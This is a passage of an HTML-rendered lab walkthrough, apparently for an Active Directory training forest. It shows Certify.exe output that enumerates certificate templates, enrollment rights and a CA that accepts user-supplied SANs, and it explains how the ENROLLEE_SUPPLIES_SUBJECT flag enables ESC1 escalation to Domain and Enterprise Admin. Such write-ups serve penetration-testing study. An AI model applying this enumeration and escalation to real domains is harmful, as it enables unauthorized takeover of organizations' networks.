+        <span class="n">Enrollment</span> <span class="n">Rights</span>           <span class="p">:</span> <span class="n">dcorp</span><span class="p">\</span><span class="n">Domain</span> <span class="n">Users</span>            <span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">719815819</span><span class="p">-</span><span class="n">3726368948</span><span class="p">-</span><span class="n">3917688648</span><span class="p">-</span><span class="n">513</span>
+                                      <span class="n">mcorp</span><span class="p">\</span><span class="n">Domain</span> <span class="n">Admins</span>           <span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">335606122</span><span class="p">-</span><span class="n">960912869</span><span class="p">-</span><span class="n">3279953914</span><span class="p">-</span><span class="n">512</span>
+                                      <span class="n">mcorp</span><span class="p">\</span><span class="n">Enterprise</span> <span class="n">Admins</span>       <span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">335606122</span><span class="p">-</span><span class="n">960912869</span><span class="p">-</span><span class="n">3279953914</span><span class="p">-</span><span class="n">519</span>
+      <span class="n">Object</span> <span class="n">Control</span> <span class="n">Permissions</span>
+        <span class="n">Owner</span>                       <span class="p">:</span> <span class="n">mcorp</span><span class="p">\</span><span class="n">Administrator</span>           <span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">335606122</span><span class="p">-</span><span class="n">960912869</span><span class="p">-</span><span class="n">3279953914</span><span class="p">-</span><span class="n">500</span>
+        <span class="n">WriteOwner</span> <span class="n">Principals</span>       <span class="p">:</span> <span class="n">mcorp</span><span class="p">\</span><span class="n">Administrator</span>           <span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">335606122</span><span class="p">-</span><span class="n">960912869</span><span class="p">-</span><span class="n">3279953914</span><span class="p">-</span><span class="n">500</span>
+                                      <span class="n">mcorp</span><span class="p">\</span><span class="n">Domain</span> <span class="n">Admins</span>           <span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">335606122</span><span class="p">-</span><span class="n">960912869</span><span class="p">-</span><span class="n">3279953914</span><span class="p">-</span><span class="n">512</span>
+                                      <span class="n">mcorp</span><span class="p">\</span><span class="n">Enterprise</span> <span class="n">Admins</span>       <span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">335606122</span><span class="p">-</span><span class="n">960912869</span><span class="p">-</span><span class="n">3279953914</span><span class="p">-</span><span class="n">519</span>
+        <span class="n">WriteDacl</span> <span class="n">Principals</span>        <span class="p">:</span> <span class="n">mcorp</span><span class="p">\</span><span class="n">Administrator</span>           <span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">335606122</span><span class="p">-</span><span class="n">960912869</span><span class="p">-</span><span class="n">3279953914</span><span class="p">-</span><span class="n">500</span>
+                                      <span class="n">mcorp</span><span class="p">\</span><span class="n">Domain</span> <span class="n">Admins</span>           <span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">335606122</span><span class="p">-</span><span class="n">960912869</span><span class="p">-</span><span class="n">3279953914</span><span class="p">-</span><span class="n">512</span>
+                                      <span class="n">mcorp</span><span class="p">\</span><span class="n">Enterprise</span> <span class="n">Admins</span>       <span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">335606122</span><span class="p">-</span><span class="n">960912869</span><span class="p">-</span><span class="n">3279953914</span><span class="p">-</span><span class="n">519</span>
+        <span class="n">WriteProperty</span> <span class="n">Principals</span>    <span class="p">:</span> <span class="n">mcorp</span><span class="p">\</span><span class="n">Administrator</span>           <span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">335606122</span><span class="p">-</span><span class="n">960912869</span><span class="p">-</span><span class="n">3279953914</span><span class="p">-</span><span class="n">500</span>
+                                      <span class="n">mcorp</span><span class="p">\</span><span class="n">Domain</span> <span class="n">Admins</span>           <span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">335606122</span><span class="p">-</span><span class="n">960912869</span><span class="p">-</span><span class="n">3279953914</span><span class="p">-</span><span class="n">512</span>
+                                      <span class="n">mcorp</span><span class="p">\</span><span class="n">Enterprise</span> <span class="n">Admins</span>       <span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">335606122</span><span class="p">-</span><span class="n">960912869</span><span class="p">-</span><span class="n">3279953914</span><span class="p">-</span><span class="n">519</span>
+
+    <span class="n">CA</span> <span class="n">Name</span>                               <span class="p">:</span> <span class="n">mcorp-dc</span><span class="p">.</span><span class="n">moneycorp</span><span class="p">.</span><span class="n">local</span><span class="p">\</span><span class="n">moneycorp-MCORP-DC-CA</span>
+    <span class="n">Template</span> <span class="n">Name</span>                         <span class="p">:</span> <span class="n">HTTPSCertificates</span>
+    <span class="n">Schema</span> <span class="n">Version</span>                        <span class="p">:</span> <span class="n">2</span>
+    <span class="n">Validity</span> <span class="n">Period</span>                       <span class="p">:</span> <span class="n">10</span> <span class="n">years</span>
+    <span class="n">Renewal</span> <span class="n">Period</span>                        <span class="p">:</span> <span class="n">6</span> <span class="n">weeks</span>
+    <span class="n">msPKI-Certificates-Name-Flag</span>          <span class="p">:</span> <span class="n">ENROLLEE_SUPPLIES_SUBJECT</span>
+    <span class="n">mspki-enrollment-flag</span>                 <span class="p">:</span> <span class="n">INCLUDE_SYMMETRIC_ALGORITHMS</span><span class="p">,</span> <span class="n">PUBLISH_TO_DS</span>
+    <span class="n">Authorized</span> <span class="n">Signatures</span> <span class="n">Required</span>        <span class="p">:</span> <span class="n">0</span>
+    <span class="n">pkiextendedkeyusage</span>                   <span class="p">:</span> <span class="n">Client</span> <span class="n">Authentication</span><span class="p">,</span> <span class="n">Encrypting</span> <span class="n">File</span> <span class="n">System</span><span class="p">,</span> <span class="n">Secure</span> <span class="n">Email</span>
+    <span class="n">mspki-certificate-application-policy</span>  <span class="p">:</span> <span class="n">Client</span> <span class="n">Authentication</span><span class="p">,</span> <span class="n">Encrypting</span> <span class="n">File</span> <span class="n">System</span><span class="p">,</span> <span class="n">Secure</span> <span class="n">Email</span>
+    <span class="n">Permissions</span>
+      <span class="n">Enrollment</span> <span class="n">Permissions</span>
+        <span class="n">Enrollment</span> <span class="n">Rights</span>           <span class="p">:</span> <span class="n">dcorp</span><span class="p">\</span><span class="n">RDPUsers</span>                <span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">719815819</span><span class="p">-</span><span class="n">3726368948</span><span class="p">-</span><span class="n">3917688648</span><span class="p">-</span><span class="n">1123</span>
+                                      <span class="n">mcorp</span><span class="p">\</span><span class="n">Domain</span> <span class="n">Admins</span>           <span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">335606122</span><span class="p">-</span><span class="n">960912869</span><span class="p">-</span><span class="n">3279953914</span><span class="p">-</span><span class="n">512</span>
+                                      <span class="n">mcorp</span><span class="p">\</span><span class="n">Enterprise</span> <span class="n">Admins</span>       <span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">335606122</span><span class="p">-</span><span class="n">960912869</span><span class="p">-</span><span class="n">3279953914</span><span class="p">-</span><span class="n">519</span>
+      <span class="n">Object</span> <span class="n">Control</span> <span class="n">Permissions</span>
+        <span class="n">Owner</span>                       <span class="p">:</span> <span class="n">mcorp</span><span class="p">\</span><span class="n">Administrator</span>           <span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">335606122</span><span class="p">-</span><span class="n">960912869</span><span class="p">-</span><span class="n">3279953914</span><span class="p">-</span><span class="n">500</span>
+        <span class="n">WriteOwner</span> <span class="n">Principals</span>       <span class="p">:</span> <span class="n">mcorp</span><span class="p">\</span><span class="n">Administrator</span>           <span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">335606122</span><span class="p">-</span><span class="n">960912869</span><span class="p">-</span><span class="n">3279953914</span><span class="p">-</span><span class="n">500</span>
+                                      <span class="n">mcorp</span><span class="p">\</span><span class="n">Domain</span> <span class="n">Admins</span>           <span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">335606122</span><span class="p">-</span><span class="n">960912869</span><span class="p">-</span><span class="n">3279953914</span><span class="p">-</span><span class="n">512</span>
+                                      <span class="n">mcorp</span><span class="p">\</span><span class="n">Enterprise</span> <span class="n">Admins</span>       <span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">335606122</span><span class="p">-</span><span class="n">960912869</span><span class="p">-</span><span class="n">3279953914</span><span class="p">-</span><span class="n">519</span>
+        <span class="n">WriteDacl</span> <span class="n">Principals</span>        <span class="p">:</span> <span class="n">mcorp</span><span class="p">\</span><span class="n">Administrator</span>           <span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">335606122</span><span class="p">-</span><span class="n">960912869</span><span class="p">-</span><span class="n">3279953914</span><span class="p">-</span><span class="n">500</span>
+                                      <span class="n">mcorp</span><span class="p">\</span><span class="n">Domain</span> <span class="n">Admins</span>           <span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">335606122</span><span class="p">-</span><span class="n">960912869</span><span class="p">-</span><span class="n">3279953914</span><span class="p">-</span><span class="n">512</span>
+                                      <span class="n">mcorp</span><span class="p">\</span><span class="n">Enterprise</span> <span class="n">Admins</span>       <span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">335606122</span><span class="p">-</span><span class="n">960912869</span><span class="p">-</span><span class="n">3279953914</span><span class="p">-</span><span class="n">519</span>
+        <span class="n">WriteProperty</span> <span class="n">Principals</span>    <span class="p">:</span> <span class="n">mcorp</span><span class="p">\</span><span class="n">Administrator</span>           <span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">335606122</span><span class="p">-</span><span class="n">960912869</span><span class="p">-</span><span class="n">3279953914</span><span class="p">-</span><span class="n">500</span>
+                                      <span class="n">mcorp</span><span class="p">\</span><span class="n">Domain</span> <span class="n">Admins</span>           <span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">335606122</span><span class="p">-</span><span class="n">960912869</span><span class="p">-</span><span class="n">3279953914</span><span class="p">-</span><span class="n">512</span>
+                                      <span class="n">mcorp</span><span class="p">\</span><span class="n">Enterprise</span> <span class="n">Admins</span>       <span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">335606122</span><span class="p">-</span><span class="n">960912869</span><span class="p">-</span><span class="n">3279953914</span><span class="p">-</span><span class="n">519</span>
+<span class="n">Code-Snippet</span><span class="p">----------------</span>
+</code></pre></div>
+
+<p>Above we the output has been snippet, but we have several  Templates configured…</p>
+<h1>Privilege Escalation to Domain Admin and Enterprise Admin using ESC1</h1>
+<p>Let’s use another command to find more juicy information. We can enumerate all templates with flag <code>enrolleeSuppliesSubject</code> set.</p>
+<p>The <code>ENROLLEE_SUPPLIES_SUBJECT</code> flag is abusable in Active Directory Certificate Services (ADCS) because it allows the requester to specify the subject name in the certificate request. This flag is set in the certificate template and enables the requester to supply the subject name in the request without requiring additional approval for the certificate issuance. This means that an attacker can request a certificate with a subject name that is not the actual name of the requester, which can be used to impersonate another user or entity within the domain.</p>
+<p><code>Certify.exe find /enrolleeSuppliesSubject</code></p>
+<div class="highlight"><pre><span></span><code>   <span class="n">_____</span>          <span class="n">_</span>   <span class="n">_</span>  <span class="n">__</span>
+  <span class="p">/</span> <span class="n">____</span><span class="p">|</span>        <span class="p">|</span> <span class="p">|</span> <span class="p">(</span><span class="n">_</span><span class="p">)/</span> <span class="n">_</span><span class="p">|</span>
+ <span class="p">|</span> <span class="p">|</span>     <span class="n">___</span> <span class="n">_</span> <span class="n">__</span><span class="p">|</span> <span class="p">|</span><span class="n">_</span> <span class="n">_</span><span class="p">|</span> <span class="p">|</span><span class="n">_</span> <span class="n">_</span>   <span class="n">_</span>
+ <span class="p">|</span> <span class="p">|</span>    <span class="p">/</span> <span class="n">_</span> <span class="p">\</span> <span class="s1">&#39;__| __| |  _| | | |</span>
+<span class="s1"> | |___|  __/ |  | |_| | | | |_| |</span>
+<span class="s1">  \_____\___|_|   \__|_|_|  \__, |</span>
+<span class="s1">                             __/ |</span>
+<span class="s1">                            |___./</span>
+<span class="s1">  v1.0.0</span>
+
+<span class="s1">[*] Action: Find certificate templates</span>
+<span class="s1">[*] Using the search base &#39;</span><span class="n">CN</span><span class="p">=</span><span class="n">Configuration</span><span class="p">,</span><span class="n">DC</span><span class="p">=</span><span class="n">moneycorp</span><span class="p">,</span><span class="n">DC</span><span class="p">=</span><span class="n">local</span><span class="s1">&#39;</span>
+
+<span class="s1">[*] Listing info about the Enterprise CA &#39;</span><span class="n">moneycorp-MCORP-DC-CA</span><span class="err">&#39;</span>
+
+    <span class="n">Enterprise</span> <span class="n">CA</span> <span class="n">Name</span>            <span class="p">:</span> <span class="n">moneycorp-MCORP-DC-CA</span>
+    <span class="n">DNS</span> <span class="n">Hostname</span>                  <span class="p">:</span> <span class="n">mcorp-dc</span><span class="p">.</span><span class="n">moneycorp</span><span class="p">.</span><span class="n">local</span>
+    <span class="n">FullName</span>                      <span class="p">:</span> <span class="n">mcorp-dc</span><span class="p">.</span><span class="n">moneycorp</span><span class="p">.</span><span class="n">local</span><span class="p">\</span><span class="n">moneycorp-MCORP-DC-CA</span>
+    <span class="n">Flags</span>                         <span class="p">:</span> <span class="n">SUPPORTS_NT_AUTHENTICATION</span><span class="p">,</span> <span class="n">CA_SERVERTYPE_ADVANCED</span>
+    <span class="n">Cert</span> <span class="n">SubjectName</span>              <span class="p">:</span> <span class="n">CN</span><span class="p">=</span><span class="n">moneycorp-MCORP-DC-CA</span><span class="p">,</span> <span class="n">DC</span><span class="p">=</span><span class="n">moneycorp</span><span class="p">,</span> <span class="n">DC</span><span class="p">=</span><span class="n">local</span>
+    <span class="n">Cert</span> <span class="n">Thumbprint</span>               <span class="p">:</span> <span class="n">8DA9C3EF73450A29BEB2C77177A5B02D912F7EA8</span>
+    <span class="n">Cert</span> <span class="n">Serial</span>                   <span class="p">:</span> <span class="n">48D51C5ED50124AF43DB7A448BF68C49</span>
+    <span class="n">Cert</span> <span class="nb">Start </span><span class="n">Date</span>               <span class="p">:</span> <span class="n">11</span><span class="p">/</span><span class="n">26</span><span class="p">/</span><span class="n">2022</span> <span class="n">1</span><span class="p">:</span><span class="n">59</span><span class="p">:</span><span class="n">16</span> <span class="n">AM</span>
+    <span class="n">Cert</span> <span class="k">End</span> <span class="n">Date</span>                 <span class="p">:</span> <span class="n">11</span><span class="p">/</span><span class="n">26</span><span class="p">/</span><span class="n">2032</span> <span class="n">2</span><span class="p">:</span><span class="n">09</span><span class="p">:</span><span class="n">15</span> <span class="n">AM</span>
+    <span class="n">Cert</span> <span class="n">Chain</span>                    <span class="p">:</span> <span class="n">CN</span><span class="p">=</span><span class="n">moneycorp-MCORP-DC-CA</span><span class="p">,</span><span class="n">DC</span><span class="p">=</span><span class="n">moneycorp</span><span class="p">,</span><span class="n">DC</span><span class="p">=</span><span class="n">local</span>
+    <span class="p">[!]</span> <span class="n">UserSpecifiedSAN</span> <span class="p">:</span> <span class="n">EDITF_ATTRIBUTESUBJECTALTNAME2</span> <span class="n">set</span><span class="p">,</span> <span class="n">enrollees</span> <span class="n">can</span> <span class="n">specify</span> <span class="n">Subject</span> <span class="n">Alternative</span> <span class="n">Names</span><span class="p">!</span>
+    <span class="n">CA</span> <span class="n">Permissions</span>                <span class="p">:</span>
+      <span class="n">Owner</span><span class="p">:</span> <span class="n">BUILTIN</span><span class="p">\</span><span class="n">Administrators</span>        <span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">32</span><span class="p">-</span><span class="n">544</span>
+
+      <span class="n">Access</span> <span class="n">Rights</span>                                     <span class="n">Principal</span>
+
+      <span class="n">Allow</span>  <span class="n">Enroll</span>                                     <span class="n">NT</span> <span class="n">AUTHORITY</span><span class="p">\</span><span class="n">Authenticated</span> <span class="n">UsersS</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">11</span>
+      <span class="n">Allow</span>  <span class="n">ManageCA</span><span class="p">,</span> <span class="n">ManageCertificates</span>               <span class="n">BUILTIN</span><span class="p">\</span><span class="n">Administrators</span>        <span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">32</span><span class="p">-</span><span class="n">544</span>
+      <span class="n">Allow</span>  <span class="n">ManageCA</span><span class="p">,</span> <span class="n">ManageCertificates</span>               <span class="n">mcorp</span><span class="p">\</span><span class="n">Domain</span> <span class="n">Admins</span>           <span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">335606122</span><span class="p">-</span><span class="n">960912869</span><span class="p">-</span><span class="n">3279953914</span><span class="p">-</span><span class="n">512</span>
+      <span class="n">Allow</span>  <span class="n">ManageCA</span><span class="p">,</span> <span class="n">ManageCertificates</span>               <span class="n">mcorp</span><span class="p">\</span><span class="n">Enterprise</span> <span class="n">Admins</span>       <span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">335606122</span><span class="p">-</span><span class="n">960912869</span><span class="p">-</span><span class="n">3279953914</span><span class="p">-</span><span class="n">519</span>
+    <span class="n">Enrollment</span> <span class="n">Agent</span> <span class="n">Restrictions</span> <span class="p">:</span> <span class="n">None</span>
+<span class="n">Enabled</span> <span class="n">certificate</span> <span class="n">templates</span> <span class="nb">where </span><span class="n">users</span> <span class="n">can</span> <span class="n">supply</span> <span class="n">a</span> <span class="n">SAN</span><span class="p">:</span>
+    <span class="n">CA</span> <span class="n">Name</span>                               <span class="p">:</span> <span class="n">mcorp-dc</span><span class="p">.</span><span class="n">moneycorp</span><span class="p">.</span><span class="n">local</span><span class="p">\</span><span class="n">moneycorp-MCORP-DC-CA</span>
+    <span class="n">Template</span> <span class="n">Name</span>                         <span class="p">:</span> <span class="n">WebServer</span>
+    <span class="n">Schema</span> <span class="n">Version</span>                        <span class="p">:</span> <span class="n">1</span>
+    <span class="n">Validity</span> <span class="n">Period</span>                       <span class="p">:</span> <span class="n">2</span> <span class="n">years</span>
+    <span class="n">Renewal</span> <span class="n">Period</span>                        <span class="p">:</span> <span class="n">6</span> <span class="n">weeks</span>
+    <span class="n">msPKI-Certificates-Name-Flag</span>          <span class="p">:</span> <span class="n">ENROLLEE_SUPPLIES_SUBJECT</span>
+    <span class="n">mspki-enrollment-flag</span>                 <span class="p">:</span> <span class="n">NONE</span>
+    <span class="n">Authorized</span> <span class="n">Signatures</span> <span class="n">Required</span>        <span class="p">:</span> <span class="n">0</span>
+    <span class="n">pkiextendedkeyusage</span>                   <span class="p">:</span> <span class="n">Server</span> <span class="n">Authentication</span>
+    <span class="n">mspki-certificate-application-policy</span>  <span class="p">:</span> <span class="p">&lt;</span><span class="n">null</span><span class="p">&gt;</span>
+    <span class="n">Permissions</span>
+      <span class="n">Enrollment</span> <span class="n">Permissions</span>
+        <span class="n">Enrollment</span> <span class="n">Rights</span>           <span class="p">:</span> <span class="n">mcorp</span><span class="p">\</span><span class="n">Domain</span> <span class="n">Admins</span>           <span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">335606122</span><span class="p">-</span><span class="n">960912869</span><span class="p">-</span><span class="n">3279953914</span><span class="p">-</span><span class="n">512</span>
+                                      <span class="n">mcorp</span><span class="p">\</span><span class="n">Enterprise</span> <span class="n">Admins</span>       <span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">335606122</span><span class="p">-</span><span class="n">960912869</span><span class="p">-</span><span class="n">3279953914</span><span class="p">-</span><span class="n">519</span>
+      <span class="n">Object</span> <span class="n">Control</span> <span class="n">Permissions</span>
+        <span class="n">Owner</span>                       <span class="p">:</span> <span class="n">mcorp</span><span class="p">\</span><span class="n">Enterprise</span> <span class="n">Admins</span>       <span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">335606122</span><span class="p">-</span><span class="n">960912869</span><span class="p">-</span><span class="n">3279953914</span><span class="p">-</span><span class="n">519</span>
+        <span class="n">WriteOwner</span> <span class="n">Principals</span>       <span class="p">:</span> <span class="n">mcorp</span><span class="p">\</span><span class="n">Domain</span> <span class="n">Admins</span>           <span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">335606122</span><span class="p">-</span><span class="n">960912869</span><span class="p">-</span><span class="n">3279953914</span><span class="p">-</span><span class="n">512</span>
+                                      <span class="n">mcorp</span><span class="p">\</span><span class="n">Enterprise</span> <span class="n">Admins</span>       <span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">335606122</span><span class="p">-</span><span class="n">960912869</span><span class="p">-</span><span class="n">3279953914</span><span class="p">-</span><span class="n">519</span>
+        <span class="n">WriteDacl</span> <span class="n">Principals</span>        <span class="p">:</span> <span class="n">mcorp</span><span class="p">\</span><span class="n">Domain</span> <span class="n">Admins</span>           <span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">335606122</span><span class="p">-</span><span class="n">960912869</span><span class="p">-</span><span class="n">3279953914</span><span class="p">-</span><span class="n">512</span>
+                                      <span class="n">mcorp</span><span class="p">\</span><span class="n">Enterprise</span> <span class="n">Admins</span>       <span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">335606122</span><span class="p">-</span><span class="n">960912869</span><span class="p">-</span><span class="n">3279953914</span><span class="p">-</span><span class="n">519</span>
+        <span class="n">WriteProperty</span> <span class="n">Principals</span>    <span class="p">:</span> <span class="n">mcorp</span><span class="p">\</span><span class="n">Domain</span> <span class="n">Admins</span>           <span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">335606122</span><span class="p">-</span><span class="n">960912869</span><span class="p">-</span><span class="n">3279953914</span><span class="p">-</span><span class="n">512</span>
+                                      <span class="n">mcorp</span><span class="p">\</span><span class="n">Enterprise</span> <span class="n">Admins</span>       <span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">335606122</span><span class="p">-</span><span class="n">960912869</span><span class="p">-</span><span class="n">3279953914</span><span class="p">-</span><span class="n">519</span>
+
+    <span class="n">CA</span> <span class="n">Name</span>                               <span class="p">:</span> <span class="n">mcorp-dc</span><span class="p">.</span><span class="n">moneycorp</span><span class="p">.</span><span class="n">local</span><span class="p">\</span><span class="n">moneycorp-MCORP-DC-CA</span>
+    <span class="n">Template</span> <span class="n">Name</span>                         <span class="p">:</span> <span class="n">SubCA</span>
+    <span class="n">Schema</span> <span class="n">Version</span>                        <span class="p">:</span> <span class="n">1</span>
+    <span class="n">Validity</span> <span class="n">Period</span>                       <span class="p">:</span> <span class="n">5</span> <span class="n">years</span>
+    <span class="n">Renewal</span> <span class="n">Period</span>                        <span class="p">:</span> <span class="n">6</span> <span class="n">weeks</span>
+    <span class="n">msPKI-Certificates-Name-Flag</span>          <span class="p">:</span> <span class="n">ENROLLEE_SUPPLIES_SUBJECT</span>
+    <span class="n">mspki-enrollment-flag</span>                 <span class="p">:</span> <span class="n">NONE</span>
+    <span class="n">Authorized</span> <span class="n">Signatures</span> <span class="n">Required</span>        <span class="p">:</span> <span class="n">0</span>
+    <span class="n">pkiextendedkeyusage</span>                   <span class="p">:</span> <span class="p">&lt;</span><span class="n">null</span><span class="p">&gt;</span>
+    <span class="n">mspki-certificate-application-policy</span>  <span class="p">:</span> <span class="p">&lt;</span><span class="n">null</span><span class="p">&gt;</span>
+    <span class="n">Permissions</span>
+      <span class="n">Enrollment</span> <span class="n">Permissions</span>
+        <span class="n">Enrollment</span> <span class="n">Rights</span>           <span class="p">:</span> <span class="n">mcorp</span><span class="p">\</span><span class="n">Domain</span> <span class="n">Admins</span>           <span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">335606122</span><span class="p">-</span><span class="n">960912869</span><span class="p">-</span><span class="n">3279953914</span><span class="p">-</span><span class="n">512</span>
+                                      <span class="n">mcorp</span><span class="p">\</span><span class="n">Enterprise</span> <span class="n">Admins</span>       <span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">335606122</span><span class="p">-</span><span class="n">960912869</span><span class="p">-</span><span class="n">3279953914</span><span class="p">-</span><span class="n">519</span>
+      <span class="n">Object</span> <span class="n">Control</span> <span class="n">Permissions</span>
+        <span class="n">Owner</span>                       <span class="p">:</span> <span class="n">mcorp</span><span class="p">\</span><span class="n">Enterprise</span> <span class="n">Admins</span>       <span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">335606122</span><span class="p">-</span><span class="n">960912869</span><span class="p">-</span><span class="n">3279953914</span><span class="p">-</span><span class="n">519</span>
+        <span class="n">WriteOwner</span> <span class="n">Principals</span>       <span class="p">:</span> <span class="n">mcorp</span><span class="p">\</span><span class="n">Domain</span> <span class="n">Admins</span>           <span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">335606122</span><span class="p">-</span><span class="n">960912869</span><span class="p">-</span><span class="n">3279953914</span><span class="p">-</span><span class="n">512</span>
+                                      <span class="n">mcorp</span><span class="p">\</span><span class="n">Enterprise</span> <span class="n">Admins</span>       <span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">335606122</span><span class="p">-</span><span class="n">960912869</span><span class="p">-</span><span class="n">3279953914</span><span class="p">-</span><span class="n">519</span>
+        <span class="n">WriteDacl</span> <span class="n">Principals</span>        <span class="p">:</span> <span class="n">mcorp</span><span class="p">\</span><span class="n">Domain</span> <span class="n">Admins</span>           <span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">335606122</span><span class="p">-</span><span class="n">960912869</span><span class="p">-</span><span class="n">3279953914</span><span class="p">-</span><span class="n">512</span>
+                                      <span class="n">mcorp</span><span class="p">\</span><span class="n">Enterprise</span> <span class="n">Admins</span>       <span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">335606122</span><span class="p">-</span><span class="n">960912869</span><span class="p">-</span><span class="n">3279953914</span><span class="p">-</span><span class="n">519</span>
